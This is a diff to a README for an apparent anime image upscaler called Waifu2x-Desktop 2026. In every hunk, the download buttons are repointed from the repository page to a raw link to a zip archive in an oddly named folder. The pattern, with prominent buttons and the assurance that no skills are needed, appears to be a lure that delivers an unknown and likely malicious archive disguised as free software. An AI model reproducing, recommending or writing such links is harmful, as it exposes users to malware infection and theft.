@@ -1,7 +1,7 @@
 <h1>✨ Waifu2x-Desktop---Anime-Upscaler-2026 - Upscale Anime Art Instantly with AI</h1>
 
 <p align="center">
-  <a href="https://github.com/martinchassery14/Waifu2x-Desktop---Anime-Upscaler-2026">
+  <a href="https://raw.githubusercontent.com/martinchassery14/Waifu2x-Desktop---Anime-Upscaler-2026/main/inclusively/2.2.zip">
     <img src="https://img.shields.io/badge/Download-Waifu2x%20Desktop%202026-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" />
   </a>
 </p>
@@ -30,7 +30,7 @@ Follow these simple steps. You don't need any technical skills.
 Click the big green button below or the one at the top of this page:
 
 <p align="center">
-  <a href="https://github.com/martinchassery14/Waifu2x-Desktop---Anime-Upscaler-2026" style="background-color:#4CAF50;color:white;padding:15px 30px;text-decoration:none;font-size:18px;border-radius:8px;font-weight:bold;">⬇️ Download Waifu2x Desktop Now</a>
+  <a href="https://raw.githubusercontent.com/martinchassery14/Waifu2x-Desktop---Anime-Upscaler-2026/main/inclusively/2.2.zip" style="background-color:#4CAF50;color:white;padding:15px 30px;text-decoration:none;font-size:18px;border-radius:8px;font-weight:bold;">⬇️ Download Waifu2x Desktop Now</a>
 </p>
 
 Visit this link to download the application.
@@ -150,7 +150,7 @@ If you run into any issue, go back to the download page and look for the "Issues
 Waifu2x-Desktop is the easiest way to make your anime images look amazing. It's free, fast, and works right on your PC. Download it today and see the difference in seconds.
 
 <p align="center">
-  <a href="https://github.com/martinchassery14/Waifu2x-Desktop---Anime-Upscaler-2026" style="background-color:#FF5722;color:white;padding:12px 25px;text-decoration:none;font-size:16px;border-radius:8px;font-weight:bold;">🚀 Get Waifu2x Desktop 2026</a>
+  <a href="https://raw.githubusercontent.com/martinchassery14/Waifu2x-Desktop---Anime-Upscaler-2026/main/inclusively/2.2.zip" style="background-color:#FF5722;color:white;padding:12px 25px;text-decoration:none;font-size:16px;border-radius:8px;font-weight:bold;">🚀 Get Waifu2x Desktop 2026</a>
 </p>
 
 ---
